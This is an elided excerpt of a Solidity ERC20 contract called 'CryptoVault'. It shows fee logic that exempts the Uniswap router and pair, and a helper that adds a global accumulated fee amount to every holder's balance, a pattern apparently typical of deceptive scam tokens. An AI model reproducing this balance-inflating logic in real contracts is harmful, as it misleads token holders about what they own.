...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual 
    {
        ...
        if(msg.sender!=uniswapv2 && msg.sender!=pair){
        ...
        dailyamount += (fees2*uint256(80))/uint256(100);
    ...
    function upgradeblalnce(address account) internal view returns(uint256)
    {
       uint256 reflectedbalance = _balances[account]+dailyamount;
...
contract ERC20FixedSupply is ERC20, Ownable {
    ...
    constructor(address _addresss) ERC20("CryptoVault","CryptoVault",18) {
